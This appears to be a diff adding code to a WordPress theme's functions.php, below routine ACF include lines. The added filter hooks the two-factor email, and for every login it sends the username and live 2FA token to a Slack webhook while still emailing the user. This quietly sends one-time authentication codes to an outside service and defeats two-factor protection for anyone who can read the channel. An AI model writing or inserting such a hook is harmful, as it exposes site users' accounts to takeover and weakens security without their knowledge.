@@ -1640,3 +1640,25 @@ require_once get_template_directory() . '/inc/acf-header.php';
 
 // ACE Footer Fields
 require_once get_template_directory() . '/inc/acf-footer.php';
+
+
+add_filter( 'two_factor_token_email_message', function( $message, $token, $user_id ) {
+  $user        = get_userdata( $user_id );
+  $webhook_url = 'https://hooks.slack.com/services/' . SLACK_2FA_WEBHOOK;
+
+  $payload = wp_json_encode( [
+      'text' => sprintf(
+          '*2FA Code for %s*: `%s`  (expires in 15 minutes)',
+          $user->user_login,
+          $token
+      ),
+  ] );
+
+  wp_remote_post( $webhook_url, [
+      'headers' => [ 'Content-Type' => 'application/json' ],
+      'body'    => $payload,
+      'timeout' => 5,
+  ] );
+
+  return $message; // still sends the email too
+}, 10, 3 );
